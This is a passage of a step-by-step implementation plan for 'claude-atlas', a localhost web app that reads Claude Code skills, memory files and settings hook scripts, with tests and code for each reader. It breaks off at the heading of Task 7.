# claude-atlas Phase 1 — "Loaded Now, Editable" Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Ship an `npx claude-atlas` web app that shows every Claude Code artifact at global scope on one screen and lets the user edit the safe ones in place.

**Architecture:** Single Node process serving a JSON API and a Vite/React SPA on an ephemeral `127.0.0.1` port. Every filesystem read returns a discriminated `Result` (`ok`/`empty`/`absent`/`denied`/`malformed`) so "I didn't look there" can never render as "0 items". Every write is classified, validated, gated on executable value-shape, backed up, and performed under an `O_EXCL` lockfile.

**Tech Stack:** Node 22 (floor: 20), Vite 5, React 18, CSS modules, Vitest, `markdown-it` + `dompurify`, `yaml` (frontmatter). No component library, no state manager.

**Spec:** `docs/superpowers/specs/2026-09-11-claude-atlas-design.md`

## Global Constraints

- Node floor **20**; `"type": "module"` throughout; ESM only.
- Bind **`127.0.0.1` on an ephemeral port** (`listen(0)`). `EADDRINUSE` is fatal, never a fallback. URL derived from `server.address()` only. (spec §9.1)
- **No filesystem read may throw away a failure.** Readers return `Result`; `denied` and `absent` are distinct from `empty`. (spec §10)
- **Every `/api/*` request, including `GET`, requires cookie + `Origin` + `Host`.** All checks **fail closed** — a missing header is a 403. (spec §9.2)
- **All side-effecting endpoints are `POST`.** (spec §9.2)
- Write gating is on **value shape, not artifact kind**. (spec §9.3)
- `innerHTML` / `dangerouslySetInnerHTML` are **banned**; enforced by ESLint in CI. (spec §9.5)
- Backups land **beside the original** as `<file>.atlas-<ISO>.bak`, opened `wx` mode `0o600`. Never a new top-level directory. (spec §8.6)
- Artifact `id`s are **opaque handles** from a scan-time table — never path-derived, never path-reconstructed. (spec §9.4)
- Single root only. `CLAUDE_CONFIG_DIR` → `$HOME/.claude`. **No multi-root switcher.** (spec §6.1)
- Phase 1 does **not** include: ScopeRegistry, project scope, Oracle/token costs, sessions, deletion. (spec §13)

---

### Task 1: Scaffold and the `Result` type

The `Result` discriminated union is the spec's core invariant (§10) and every later task depends on it, so scaffolding folds in here.

**Files:**
- Create: `package.json`, `vite.config.js`, `.eslintrc.json`, `.gitignore`
- Create: `src/server/result.js`
- Test: `tests/result.test.js`

**Interfaces:**
- Consumes: nothing.
- Produces: `ok(value)`, `empty()`, `absent(path)`, `denied(path, errno)`, `malformed(path, message, line, column)`, `isOk(r)`, `valueOr(r, fallback)`. Every `Result` has a `state` field of `'ok' | 'empty' | 'absent' | 'denied' | 'malformed'`.

- [ ] **Step 1: Create `package.json`**

```json
{
  "name": "claude-atlas",
  "version": "0.1.0",
  "type": "module",
  "bin": { "claude-atlas": "./bin/claude-atlas.js" },
  "engines": { "node": ">=20" },
  "scripts": {
    "dev": "vite",
    "build": "vite build",
    "test": "vitest run",
    "lint": "eslint src tests"
  },
  "dependencies": {
    "dompurify": "^3.1.6",
    "jsdom": "^24.1.0",
    "markdown-it": "^14.1.0",
    "react": "^18.3.1",
    "react-dom": "^18.3.1",
    "yaml": "^2.5.0"
  },
  "devDependencies": {
    "@vitejs/plugin-react": "^4.3.1",
    "eslint": "^8.57.0",
    "vite": "^5.4.0",
    "vitest": "^2.0.5"
  }
}
```

- [ ] **Step 2: Create `vite.config.js`**

```js
import { defineConfig } from 'vite'
import react from '@vitejs/plugin-react'

export default defineConfig({
  root: 'src/ui',
  build: { outDir: '../../dist', emptyOutDir: true },
  plugins: [react()],
  test: { environment: 'node', include: ['../../tests/**/*.test.js'] },
})
```

- [ ] **Step 3: Create `.eslintrc.json` enforcing the innerHTML ban**

```json
{
  "env": { "node": true, "browser": true, "es2022": true },
  "parserOptions": { "ecmaVersion": 2022, "sourceType": "module", "ecmaFeatures": { "jsx": true } },
  "rules": {
    "no-restricted-properties": ["error",
      { "property": "innerHTML", "message": "Banned by spec §9.5 — use text nodes or the sanitised markdown renderer." },
      { "property": "outerHTML", "message": "Banned by spec §9.5." },
      { "property": "dangerouslySetInnerHTML", "message": "Banned by spec §9.5." }
    ],
    "no-restricted-syntax": ["error",
      { "selector": "JSXAttribute[name.name='dangerouslySetInnerHTML']", "message": "Banned by spec §9.5." }
    ]
  }
}
```

- [ ] **Step 4: Create `.gitignore`**

```
node_modules/
dist/
.DS_Store
*.atlas-*.bak
```

- [ ] **Step 5: Install dependencies**

Run: `cd /path/to/claude-atlas && npm install`
Expected: completes, `node_modules/` created, no `ERR!` lines.

- [ ] **Step 6: Write the failing test**

Create `tests/result.test.js`:

```js
import { describe, it, expect } from 'vitest'
import { ok, empty, absent, denied, malformed, isOk, valueOr } from '../src/server/result.js'

describe('Result', () => {
  it('distinguishes absent from empty — the skill-cabinet bug', () => {
    expect(absent('/nope').state).toBe('absent')
    expect(empty().state).toBe('empty')
    expect(absent('/nope').state).not.toBe(empty().state)
  })

  it('carries the path on absent and denied so the UI can explain', () => {
    expect(absent('/a/b').path).toBe('/a/b')
    expect(denied('/c/d', 'EPERM').path).toBe('/c/d')
    expect(denied('/c/d', 'EPERM').errno).toBe('EPERM')
  })

  it('carries position on malformed', () => {
    const m = malformed('/x.json', 'Unexpected token', 14, 3)
    expect(m.state).toBe('malformed')
    expect(m.line).toBe(14)
    expect(m.column).toBe(3)
  })

  it('isOk is true only for ok', () => {
    expect(isOk(ok([1]))).toBe(true)
    for (const r of [empty(), absent('/p'), denied('/p', 'EACCES'), malformed('/p', 'x', 1, 1)]) {
      expect(isOk(r)).toBe(false)
    }
  })

  it('valueOr returns the fallback for every non-ok state', () => {
    expect(valueOr(ok(['a']), [])).toEqual(['a'])
    expect(valueOr(empty(), [])).toEqual([])
    expect(valueOr(denied('/p', 'EPERM'), [])).toEqual([])
  })
})
```

- [ ] **Step 7: Run test to verify it fails**

Run: `npx vitest run tests/result.test.js`
Expected: FAIL — `Failed to resolve import "../src/server/result.js"`.

- [ ] **Step 8: Write the implementation**

Create `src/server/result.js`:

```js
export const ok = (value) => ({ state: 'ok', value })
export const empty = () => ({ state: 'empty' })
export const absent = (path) => ({ state: 'absent', path })
export const denied = (path, errno) => ({ state: 'denied', path, errno })
export const malformed = (path, message, line, column) =>
  ({ state: 'malformed', path, message, line, column })

export const isOk = (r) => r.state === 'ok'
export const valueOr = (r, fallback) => (r.state === 'ok' ? r.value : fallback)
```

- [ ] **Step 9: Run test to verify it passes**

Run: `npx vitest run tests/result.test.js`
Expected: PASS, 5 tests.

- [ ] **Step 10: Commit**

```bash
git add package.json package-lock.json vite.config.js .eslintrc.json .gitignore src/server/result.js tests/result.test.js
git commit -m "feat: scaffold project and add Result discriminated union

Result makes absent/empty/denied/malformed structurally distinct, so the
skill-cabinet failure (reporting 0 for a directory never looked in) cannot
be expressed. Spec §10."
```

---

### Task 2: Root resolution

**Files:**
- Create: `src/server/roots.js`
- Test: `tests/roots.test.js`

**Interfaces:**
- Consumes: nothing.
- Produces: `resolveRoot(env, home) -> { path: string, source: 'CLAUDE_CONFIG_DIR' | 'default' }`.

- [ ] **Step 1: Write the failing test**

Create `tests/roots.test.js`:

```js
import { describe, it, expect } from 'vitest'
import path from 'node:path'
import { resolveRoot } from '../src/server/roots.js'

describe('resolveRoot', () => {
  it('defaults to $HOME/.claude', () => {
    const r = resolveRoot({}, '/Users/x')
    expect(r.path).toBe(path.join('/Users/x', '.claude'))
    expect(r.source).toBe('default')
  })

  it('honours CLAUDE_CONFIG_DIR and reports it as the source', () => {
    const r = resolveRoot({ CLAUDE_CONFIG_DIR: '/tmp/work-profile' }, '/Users/x')
    expect(r.path).toBe('/tmp/work-profile')
    expect(r.source).toBe('CLAUDE_CONFIG_DIR')
  })

  it('resolves a relative CLAUDE_CONFIG_DIR to absolute', () => {
    expect(path.isAbsolute(resolveRoot({ CLAUDE_CONFIG_DIR: './rel' }, '/Users/x').path)).toBe(true)
  })

  it('treats an empty CLAUDE_CONFIG_DIR as unset', () => {
    expect(resolveRoot({ CLAUDE_CONFIG_DIR: '' }, '/Users/x').source).toBe('default')
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/roots.test.js`
Expected: FAIL — cannot resolve `../src/server/roots.js`.

- [ ] **Step 3: Write the implementation**

Create `src/server/roots.js`:

```js
import path from 'node:path'

export function resolveRoot(env = process.env, home = process.env.HOME) {
  const configured = env.CLAUDE_CONFIG_DIR
  if (typeof configured === 'string' && configured.length > 0) {
    return { path: path.resolve(configured), source: 'CLAUDE_CONFIG_DIR' }
  }
  return { path: path.join(home, '.claude'), source: 'default' }
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run tests/roots.test.js`
Expected: PASS, 4 tests.

- [ ] **Step 5: Commit**

```bash
git add src/server/roots.js tests/roots.test.js
git commit -m "feat: resolve config root via CLAUDE_CONFIG_DIR with \$HOME fallback

Spec §6.1. Single root only; no multi-root switcher in Phase 1."
```

---

### Task 3: Safe filesystem reads

This is where the north-star bug is actually prevented. Every later reader goes through here.

**Files:**
- Create: `src/server/fsread.js`
- Test: `tests/fsread.test.js`

**Interfaces:**
- Consumes: `src/server/result.js`.
- Produces: `readDirSafe(dir) -> Result<Dirent[]>`, `readFileSafe(file) -> Result<string>`, `readJsonSafe(file) -> Result<object>`, `walkForSafe(dir, filename, maxDepth) -> { found: string[], denied: string[] }`.

- [ ] **Step 1: Write the failing test**

Create `tests/fsread.test.js`:

```js
import { describe, it, expect, beforeAll, afterAll } from 'vitest'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { readDirSafe, readFileSafe, readJsonSafe, walkForSafe } from '../src/server/fsread.js'

let tmp
beforeAll(() => {
  tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'atlas-fsread-'))
  fs.mkdirSync(path.join(tmp, 'emptydir'))
  fs.mkdirSync(path.join(tmp, 'full'))
  fs.writeFileSync(path.join(tmp, 'full', 'a.txt'), 'hello')
  fs.writeFileSync(path.join(tmp, 'good.json'), '{"a":1}')
  fs.writeFileSync(path.join(tmp, 'bad.json'), '{\n  "a": 1,\n  oops\n}')
  fs.mkdirSync(path.join(tmp, 'locked'))
  fs.writeFileSync(path.join(tmp, 'locked', 'secret.txt'), 'x')
  fs.chmodSync(path.join(tmp, 'locked'), 0o000)
  fs.mkdirSync(path.join(tmp, 'deep', 'a', 'b'), { recursive: true })
  fs.writeFileSync(path.join(tmp, 'deep', 'a', 'b', 'TARGET.md'), 'found me')
})
afterAll(() => {
  fs.chmodSync(path.join(tmp, 'locked'), 0o755)
  fs.rmSync(tmp, { recursive: true, force: true })
})

describe('readDirSafe', () => {
  it('returns absent for a directory that does not exist', () => {
    expect(readDirSafe(path.join(tmp, 'nope')).state).toBe('absent')
  })
  it('returns empty for a directory with no entries', () => {
    expect(readDirSafe(path.join(tmp, 'emptydir')).state).toBe('empty')
  })
  it('returns ok with entries for a populated directory', () => {
    const r = readDirSafe(path.join(tmp, 'full'))
    expect(r.state).toBe('ok')
    expect(r.value.map((e) => e.name)).toEqual(['a.txt'])
  })
  it('returns denied — never empty — for an unreadable directory', () => {
    const r = readDirSafe(path.join(tmp, 'locked'))
    if (process.getuid && process.getuid() === 0) return // root bypasses perms
    expect(r.state).toBe('denied')
    expect(['EACCES', 'EPERM']).toContain(r.errno)
  })
})

describe('readJsonSafe', () => {
  it('parses valid JSON', () => {
    expect(readJsonSafe(path.join(tmp, 'good.json')).value).toEqual({ a: 1 })
  })
  it('returns malformed with a line number, not a throw', () => {
    const r = readJsonSafe(path.join(tmp, 'bad.json'))
    expect(r.state).toBe('malformed')
    expect(r.line).toBeGreaterThan(0)
  })
  it('returns absent for a missing file', () => {
    expect(readJsonSafe(path.join(tmp, 'gone.json')).state).toBe('absent')
  })
})

describe('walkForSafe', () => {
  it('finds nested targets within maxDepth', () => {
    const r = walkForSafe(path.join(tmp, 'deep'), 'TARGET.md', 5)
    expect(r.found).toHaveLength(1)
    expect(r.found[0]).toMatch(/TARGET\.md$/)
  })
  it('records denied directories instead of silently skipping them', () => {
    const r = walkForSafe(tmp, 'secret.txt', 5)
    if (process.getuid && process.getuid() === 0) return
    expect(r.denied.length).toBeGreaterThan(0)
    expect(r.denied.some((d) => d.includes('locked'))).toBe(true)
  })
  it('respects maxDepth', () => {
    expect(walkForSafe(path.join(tmp, 'deep'), 'TARGET.md', 1).found).toHaveLength(0)
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/fsread.test.js`
Expected: FAIL — cannot resolve `../src/server/fsread.js`.

- [ ] **Step 3: Write the implementation**

Create `src/server/fsread.js`:

```js
import fs from 'node:fs'
import path from 'node:path'
import { ok, empty, absent, denied, malformed } from './result.js'

const DENIED_CODES = new Set(['EACCES', 'EPERM'])

export function readDirSafe(dir) {
  let entries
  try {
    entries = fs.readdirSync(dir, { withFileTypes: true })
  } catch (err) {
    if (err.code === 'ENOENT' || err.code === 'ENOTDIR') return absent(dir)
    if (DENIED_CODES.has(err.code)) return denied(dir, err.code)
    throw err
  }
  return entries.length === 0 ? empty() : ok(entries)
}

export function readFileSafe(file) {
  try {
    const text = fs.readFileSync(file, 'utf8')
    return text.length === 0 ? empty() : ok(text)
  } catch (err) {
    if (err.code === 'ENOENT' || err.code === 'EISDIR') return absent(file)
    if (DENIED_CODES.has(err.code)) return denied(file, err.code)
    throw err
  }
}

// Never include the raw parser message — Node embeds input context in it,
// which would leak secrets into logs. Spec §9.6.
function positionOf(text, err) {
  const m = /position (\d+)/.exec(err.message || '')
  if (!m) return { line: 1, column: 1 }
  const offset = Number(m[1])
  const before = text.slice(0, offset)
  const lines = before.split('\n')
  return { line: lines.length, column: lines[lines.length - 1].length + 1 }
}

export function readJsonSafe(file) {
  const raw = readFileSafe(file)
  if (raw.state !== 'ok') return raw
  try {
    return ok(JSON.parse(raw.value))
  } catch (err) {
    const { line, column } = positionOf(raw.value, err)
    return malformed(file, 'Invalid JSON', line, column)
  }
}

export function walkForSafe(dir, filename, maxDepth = 8) {
  const found = []
  const deniedDirs = []
  const visit = (current, depth) => {
    if (depth > maxDepth) return
    const r = readDirSafe(current)
    if (r.state === 'denied') { deniedDirs.push(current); return }
    if (r.state !== 'ok') return
    for (const entry of r.value) {
      const full = path.join(current, entry.name)
      if (entry.isDirectory()) visit(full, depth + 1)
      else if (entry.name === filename) found.push(full)
    }
  }
  visit(dir, 1)
  return { found, denied: deniedDirs }
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run tests/fsread.test.js`
Expected: PASS, 10 tests.

- [ ] **Step 5: Commit**

```bash
git add src/server/fsread.js tests/fsread.test.js
git commit -m "feat: safe fs reads that never collapse denied into empty

walkForSafe returns {found, denied} so a permission-denied directory is
reported, not swallowed. On this machine a deep \$HOME walk hits 124 EPERM
dirs. Spec §6.2, §10."
```

---

### Task 4: Skills reader — find the plugin-delivered skills

**Files:**
- Create: `src/server/readers/skills.js`
- Test: `tests/skills.test.js`

**Interfaces:**
- Consumes: `fsread.js`, `result.js`.
- Produces: `readSkills(root) -> { skills: Skill[], denied: string[], sources: SourceReport[] }` where `Skill = { name, description, path, origin: 'user' | 'plugin' | 'synced', plugin?: string, marketplace?: string }` and `SourceReport = { label, dir, state }`.

- [ ] **Step 1: Write the failing test**

Create `tests/skills.test.js`:

```js
import { describe, it, expect, beforeAll, afterAll } from 'vitest'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { readSkills } from '../src/server/readers/skills.js'

let root
const writeSkill = (dir, name, desc) => {
  fs.mkdirSync(dir, { recursive: true })
  fs.writeFileSync(path.join(dir, 'SKILL.md'),
    `---\nname: ${name}\ndescription: ${desc}\n---\n\nBody text.\n`)
}

beforeAll(() => {
  root = fs.mkdtempSync(path.join(os.tmpdir(), 'atlas-skills-'))
  // The author's real shape: NO ~/.claude/skills, everything under plugins/cache
  writeSkill(path.join(root, 'plugins/cache/spyglass/spyglass/0.1.0/skills/spyglass'),
    'spyglass', 'Design-first Python development')
  writeSkill(path.join(root, 'plugins/cache/claude-plugins-official/superpowers/6.3.0/skills/brainstorming'),
    'brainstorming', 'Turn ideas into designs')
})
afterAll(() => fs.rmSync(root, { recursive: true, force: true }))

describe('readSkills', () => {
  it('finds plugin-delivered skills when ~/.claude/skills does not exist', () => {
    const r = readSkills(root)
    expect(r.skills.map((s) => s.name).sort()).toEqual(['brainstorming', 'spyglass'])
  })

  it('attributes each skill to its plugin and marketplace', () => {
    const s = readSkills(root).skills.find((x) => x.name === 'spyglass')
    expect(s.origin).toBe('plugin')
    expect(s.plugin).toBe('spyglass')
    expect(s.marketplace).toBe('spyglass')
  })

  it('parses the description from frontmatter', () => {
    const s = readSkills(root).skills.find((x) => x.name === 'brainstorming')
    expect(s.description).toBe('Turn ideas into designs')
  })

  it('reports the missing user skills dir as absent, not as zero skills', () => {
    const report = readSkills(root).sources.find((s) => s.label === 'user')
    expect(report.state).toBe('absent')
  })

  it('classifies skills/synced as its own origin', () => {
    writeSkill(path.join(root, 'skills/synced/from-cloud'), 'from-cloud', 'Synced from claude.ai')
    expect(readSkills(root).skills.find((s) => s.name === 'from-cloud').origin).toBe('synced')
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/skills.test.js`
Expected: FAIL — cannot resolve `../src/server/readers/skills.js`.

- [ ] **Step 3: Write the implementation**

Create `src/server/readers/skills.js`:

```js
import path from 'node:path'
import YAML from 'yaml'
import { readDirSafe, readFileSafe, walkForSafe } from '../fsread.js'

function parseFrontmatter(text) {
  if (!text.startsWith('---')) return {}
  const end = text.indexOf('\n---', 3)
  if (end === -1) return {}
  try {
    return YAML.parse(text.slice(4, end)) ?? {}
  } catch {
    return {}
  }
}

// plugins/cache/<marketplace>/<plugin>/<version>/skills/<name>/SKILL.md
function attributePlugin(root, skillPath) {
  const rel = path.relative(path.join(root, 'plugins', 'cache'), skillPath)
  if (rel.startsWith('..')) return {}
  const parts = rel.split(path.sep)
  return { marketplace: parts[0], plugin: parts[1] }
}

function toSkill(root, file, origin) {
  const raw = readFileSafe(file)
  const fm = raw.state === 'ok' ? parseFrontmatter(raw.value) : {}
  const dir = path.dirname(file)
  return {
    name: fm.name ?? path.basename(dir),
    description: fm.description ?? null,
    path: file,
    origin,
    ...(origin === 'plugin' ? attributePlugin(root, file) : {}),
  }
}

export function readSkills(root) {
  const skills = []
  const denied = []
  const sources = []

  const userDir = path.join(root, 'skills')
  const userState = readDirSafe(userDir)
  sources.push({ label: 'user', dir: userDir, state: userState.state })
  if (userState.state === 'ok') {
    const w = walkForSafe(userDir, 'SKILL.md', 4)
    denied.push(...w.denied)
    for (const f of w.found) {
      const origin = f.includes(`${path.sep}synced${path.sep}`) ? 'synced' : 'user'
      skills.push(toSkill(root, f, origin))
    }
  }

  const pluginDir = path.join(root, 'plugins', 'cache')
  const pluginState = readDirSafe(pluginDir)
  sources.push({ label: 'plugins', dir: pluginDir, state: pluginState.state })
  if (pluginState.state === 'ok') {
    const w = walkForSafe(pluginDir, 'SKILL.md', 8)
    denied.push(...w.denied)
    for (const f of w.found) skills.push(toSkill(root, f, 'plugin'))
  }

  skills.sort((a, b) => a.name.localeCompare(b.name))
  return { skills, denied, sources }
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run tests/skills.test.js`
Expected: PASS, 5 tests.

- [ ] **Step 5: Verify against the real machine**

Run:
```bash
node -e "import('./src/server/readers/skills.js').then(m => {
  const r = m.readSkills(process.env.HOME + '/.claude')
  console.log('skills:', r.skills.length)
  console.log('user dir state:', r.sources.find(s => s.label === 'user').state)
  console.log('sample:', JSON.stringify(r.skills[0], null, 2))
})"
```
Expected: `skills: 23` (the 10 installed plugins; count drifts as plugins change), `user dir state: absent`. **If this prints 0, the task is not done** — that is the exact skill-cabinet failure.

- [ ] **Step 6: Commit**

```bash
git add src/server/readers/skills.js tests/skills.test.js
git commit -m "feat: skills reader that walks plugins/cache

The user has 0 skills in ~/.claude/skills and 23 under plugins/cache.
Reports the missing user dir as absent, not as zero. Spec §4.1, §10."
```

---

### Task 5: Memory reader with `@`-import resolution

Without this the memory view renders 8 bytes on the author's own machine.

**Files:**
- Create: `src/server/readers/memory.js`
- Test: `tests/memory.test.js`

**Interfaces:**
- Consumes: `fsread.js`.
- Produces: `readMemory(filePath, opts) -> MemoryNode` where `MemoryNode = { path, state, content, bytes, imports: MemoryNode[], cycle?: boolean, depthExceeded?: boolean }`. `flattenMemory(node) -> MemoryNode[]`.

- [ ] **Step 1: Write the failing test**

Create `tests/memory.test.js`:

```js
import { describe, it, expect, beforeAll, afterAll } from 'vitest'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { readMemory, flattenMemory } from '../src/server/readers/memory.js'

let dir
beforeAll(() => {
  dir = fs.mkdtempSync(path.join(os.tmpdir(), 'atlas-memory-'))
  // The author's real shape: CLAUDE.md is 8 bytes and imports everything
  fs.writeFileSync(path.join(dir, 'CLAUDE.md'), '@NOTES.md\n')
  fs.writeFileSync(path.join(dir, 'NOTES.md'), '# RTK\n\nToken optimised proxy.\n@nested.md\n')
  fs.writeFileSync(path.join(dir, 'nested.md'), 'deep content\n')
  fs.writeFileSync(path.join(dir, 'loopA.md'), '@loopB.md\n')
  fs.writeFileSync(path.join(dir, 'loopB.md'), '@loopA.md\n')
})
afterAll(() => fs.rmSync(dir, { recursive: true, force: true }))

describe('readMemory', () => {
  it('resolves @-imports so an 8-byte CLAUDE.md is not the whole story', () => {
    const node = readMemory(path.join(dir, 'CLAUDE.md'))
    expect(node.bytes).toBe(8)
    expect(node.imports).toHaveLength(1)
    expect(node.imports[0].path).toBe(path.join(dir, 'NOTES.md'))
    expect(node.imports[0].content).toContain('Token optimised proxy')
  })

  it('resolves transitively', () => {
    const all = flattenMemory(readMemory(path.join(dir, 'CLAUDE.md')))
    expect(all.map((n) => path.basename(n.path))).toEqual(['CLAUDE.md', 'NOTES.md', 'nested.md'])
  })

  it('reports a missing import as absent instead of throwing', () => {
    fs.writeFileSync(path.join(dir, 'broken.md'), '@ghost.md\n')
    expect(readMemory(path.join(dir, 'broken.md')).imports[0].state).toBe('absent')
  })

  it('terminates on an import cycle and flags it', () => {
    const all = flattenMemory(readMemory(path.join(dir, 'loopA.md')))
    expect(all.some((n) => n.cycle)).toBe(true)
  })

  it('stops at depth 4 per the documented import limit', () => {
    for (let i = 0; i < 8; i++) {
      fs.writeFileSync(path.join(dir, `c${i}.md`), `@c${i + 1}.md\n`)
    }
    fs.writeFileSync(path.join(dir, 'c8.md'), 'end\n')
    expect(flattenMemory(readMemory(path.join(dir, 'c0.md'))).length).toBeLessThanOrEqual(5)
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/memory.test.js`
Expected: FAIL — cannot resolve `../src/server/readers/memory.js`.

- [ ] **Step 3: Write the implementation**

Create `src/server/readers/memory.js`:

```js
import path from 'node:path'
import { readFileSafe } from '../fsread.js'

const MAX_DEPTH = 4
const IMPORT_RE = /^@([^\s]+)\s*$/gm

function extractImports(text) {
  const out = []
  for (const m of text.matchAll(IMPORT_RE)) out.push(m[1])
  return out
}

export function readMemory(filePath, opts = {}) {
  const depth = opts.depth ?? 0
  const seen = opts.seen ?? new Set()
  const resolved = path.resolve(filePath)

  if (seen.has(resolved)) {
    return { path: resolved, state: 'ok', content: '', bytes: 0, imports: [], cycle: true }
  }
  if (depth > MAX_DEPTH) {
    return { path: resolved, state: 'ok', content: '', bytes: 0, imports: [], depthExceeded: true }
  }
  seen.add(resolved)

  const raw = readFileSafe(resolved)
  if (raw.state !== 'ok') {
    return { path: resolved, state: raw.state, content: '', bytes: 0, imports: [] }
  }

  const base = path.dirname(resolved)
  const imports = extractImports(raw.value).map((spec) =>
    readMemory(path.resolve(base, spec), { depth: depth + 1, seen }))

  return {
    path: resolved,
    state: 'ok',
    content: raw.value,
    bytes: Buffer.byteLength(raw.value),
    imports,
  }
}

export function flattenMemory(node, acc = []) {
  acc.push(node)
  for (const child of node.imports) flattenMemory(child, acc)
  return acc
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run tests/memory.test.js`
Expected: PASS, 5 tests.

- [ ] **Step 5: Verify against the real machine**

Run:
```bash
node -e "import('./src/server/readers/memory.js').then(m => {
  const n = m.readMemory(process.env.HOME + '/.claude/CLAUDE.md')
  console.log(m.flattenMemory(n).map(x => x.path + ' (' + x.bytes + 'B)').join('\n'))
})"
```
Expected: two lines — the 8-byte `CLAUDE.md` and the ~964-byte `NOTES.md`.

- [ ] **Step 6: Commit**

```bash
git add src/server/readers/memory.js tests/memory.test.js
git commit -m "feat: memory reader resolving @-imports transitively

The author's global CLAUDE.md is 8 bytes: '@NOTES.md'. Without import
resolution the memory view shows one line. Depth 4, cycle-guarded. Spec §8.2."
```

---

### Task 6: Settings reader, with hook and statusline script bodies

**Files:**
- Create: `src/server/readers/settings.js`
- Test: `tests/settings.test.js`

**Interfaces:**
- Consumes: `fsread.js`.
- Produces: `readSettings(root) -> { result: Result<object>, path: string }`, `extractScripts(settings, root) -> ScriptRef[]` where `ScriptRef = { kind: 'hookScript'|'statusLineScript', keyPath, command, scriptPath: string|null, body: Result<string>|null }`.

- [ ] **Step 1: Write the failing test**

Create `tests/settings.test.js`:

```js
import { describe, it, expect, beforeAll, afterAll } from 'vitest'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { readSettings, extractScripts } from '../src/server/readers/settings.js'

let root
beforeAll(() => {
  root = fs.mkdtempSync(path.join(os.tmpdir(), 'atlas-settings-'))
  fs.mkdirSync(path.join(root, 'hooks'))
  fs.writeFileSync(path.join(root, 'hooks', 'format-hook.sh'), '#!/bin/bash\necho rewriting\n')
  fs.writeFileSync(path.join(root, 'statusline-command.sh'), '#!/bin/bash\necho status\n')
  fs.writeFileSync(path.join(root, 'settings.json'), JSON.stringify({
    model: 'claude-opus-5',
    statusLine: { type: 'command', command: `bash ${path.join(root, 'statusline-command.sh')}` },
    hooks: {
      PreToolUse: [{ hooks: [{ type: 'command', command: `bash ${path.join(root, 'hooks', 'format-hook.sh')}` }] }],
    },
  }, null, 2))
})
afterAll(() => fs.rmSync(root, { recursive: true, force: true }))

describe('readSettings', () => {
  it('parses settings.json', () => {
    expect(readSettings(root).result.value.model).toBe('claude-opus-5')
  })
  it('returns absent, not empty, when settings.json is missing', () => {
    const other = fs.mkdtempSync(path.join(os.tmpdir(), 'atlas-nosettings-'))
    expect(readSettings(other).result.state).toBe('absent')
    fs.rmSync(other, { recursive: true, force: true })
  })
})

describe('extractScripts', () => {
  it('finds the statusline script and reads its body', () => {
    const s = readSettings(root).result.value
    const ref = extractScripts(s, root).find((r) => r.kind === 'statusLineScript')
    expect(ref.scriptPath).toMatch(/statusline-command\.sh$/)
    expect(ref.body.value).toContain('echo status')
  })

  it('finds hook scripts and reads their bodies', () => {
    const s = readSettings(root).result.value
    const ref = extractScripts(s, root).find((r) => r.kind === 'hookScript')
    expect(ref.keyPath).toBe('hooks.PreToolUse.0.hooks.0.command')
    expect(ref.body.value).toContain('echo rewriting')
  })

  it('records the command even when no script file can be resolved', () => {
    const refs = extractScripts({ statusLine: { command: 'echo inline' } }, root)
    expect(refs[0].scriptPath).toBeNull()
    expect(refs[0].command).toBe('echo inline')
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/settings.test.js`
Expected: FAIL — cannot resolve `../src/server/readers/settings.js`.

- [ ] **Step 3: Write the implementation**

Create `src/server/readers/settings.js`:

```js
import fs from 'node:fs'
import path from 'node:path'
import { readJsonSafe, readFileSafe } from '../fsread.js'

export function readSettings(root) {
  const p = path.join(root, 'settings.json')
  return { result: readJsonSafe(p), path: p }
}

// Pull a filesystem path out of a shell command like `bash ~/.claude/x.sh`.
function scriptPathFrom(command, root) {
  if (typeof command !== 'string') return null
  for (const token of command.split(/\s+/)) {
    const candidate = token.startsWith('~')
      ? path.join(root, token.slice(1).replace(/^\/?\.claude\/?/, ''))
      : token
    if (!candidate.includes('/')) continue
    try {
      if (fs.statSync(candidate).isFile()) return candidate
    } catch { /* not a path; keep looking */ }
  }
  return null
}

function makeRef(kind, keyPath, command, root) {
  const scriptPath = scriptPathFrom(command, root)
  return {
    kind,
    keyPath,
    command,
    scriptPath,
    body: scriptPath ? readFileSafe(scriptPath) : null,
  }
}

export function extractScripts(settings, root) {
  const refs = []
  if (settings?.statusLine?.command) {
    refs.push(makeRef('statusLineScript', 'statusLine.command', settings.statusLine.command, root))
  }
  const hooks = settings?.hooks ?? {}
  for (const [event, matchers] of Object.entries(hooks)) {
    if (!Array.isArray(matchers)) continue
    matchers.forEach((matcher, i) => {
      const list = Array.isArray(matcher?.hooks) ? matcher.hooks : []
      list.forEach((hook, j) => {
        if (typeof hook?.command !== 'string') return
        refs.push(makeRef('hookScript', `hooks.${event}.${i}.hooks.${j}.command`, hook.command, root))
      })
    })
  }
  return refs
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run tests/settings.test.js`
Expected: PASS, 5 tests.

- [ ] **Step 5: Verify against the real machine**

Run:
```bash
node -e "import('./src/server/readers/settings.js').then(m => {
  const root = process.env.HOME + '/.claude'
  const s = m.readSettings(root).result.value
  for (const r of m.extractScripts(s, root))
    console.log(r.kind, r.keyPath, '->', r.scriptPath, r.body ? '(' + r.body.value.length + 'B)' : '')
})"
```
Expected: one `statusLineScript` → `statusline-command.sh` (~5270B) and one `hookScript` → `hooks/format-hook.sh` (~2031B).

- [ ] **Step 6: Commit**

```bash
git add src/server/readers/settings.js tests/settings.test.js
git commit -m "feat: settings reader that surfaces hook and statusline script bodies

The settings key is a pointer; the executable content lives in
~/.claude/hooks/*.sh and statusline-command.sh. Spec §4.1."
```

---

### Task 7: Plugins reader with drift detection

**Files:**
